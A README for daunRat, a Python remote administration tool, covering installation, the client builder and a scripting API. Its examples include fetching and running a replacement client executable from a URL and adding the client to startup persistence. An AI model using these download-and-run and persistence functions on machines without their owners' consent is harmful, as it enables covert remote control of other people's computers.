# daunRat

Remote administration tool based on [daun](https://github.com/BarsTiger/daun)

## Installation:
Install `git` and `python3`
```bash
git clone https://github.com/BarsTiger/daunRat --recurse-submodules
cd daunRat
python configure.py
```
Use `admin\dist\daunRat_admin.exe` or shortcut to run admin.

Use `cd client & venv\Scripts\python.exe builder.py & cd ..` or shortcut to run builder.
It will install curses and exit with error code first time, `use command one time more`.

## Global installation without building exes:
```bash
git clone https://github.com/BarsTiger/daunRat --recurse-submodules
cd daunRat
pip install -r requirements.txt
python -m venv client/venv
cd client
venv\Scripts\activate
pip install -r requirements.txt
venv\Scripts\deactivate
cd ..
```
Use `cd admin & python daunRat_admin.py & cd ..` to run admin.

Use `cd client & python builder.py & cd ..` to run builder.
It will install curses and exit with error code first time, `use command one time more`.

## Using daunRat api in `Python` section:
You can use these libs by default:
```
subprocess
sys
os
time
daun
daunrat
```
`daun` is imported `modules` folder from [daun](https://github.com/BarsTiger/daun), you can use
code from it, for example:
```python
daun.wallpaper.set_wallpaper("path/to/image.jpg")
daun.set_wallpaper("path/to/image.jpg")
daun.download("https://example.com/file.exe")
daun.process.kill("process_name")
daun.kill("process_name")
...
```
`daunrat` is imported `selfutil.py` from daunRat modules. It contains some useful functions
for administering daunRat. For example we built daunRat and renamed it to `client.exe`:
```python
# If you need to redownload daunRat from server and run it with stopping 
# old version, use this:
daunrat.upgrade(url="https://example.com/new_client.exe", old="client.exe", 
                destination="client.exe", command="client.exe")

# If you need to restart daunRat, use this:
daunrat.restart("client.exe")

# If you need to add daunRat to startup, use this:
daunrat.startup(startupname="client")
# Or to copy daunRat to other folder before:
daunrat.startup(startupname="client", 
                copy_from="client.exe", copy_to="c:\client.exe")
```
Also, you can use `log` function to send logs to admin, pusher and pysher client and receiver.

## Adding custom commands and imports:
You can add custom code to `custom_imports.py` file. If you need to add libs, that are installed
with pip, use this:
```bash
cd client
venv\Scripts\activate
pip install module_name
venv\Scripts\deactivate
cd ..
```
`custom_imports.py`:
```python
import module_name
```
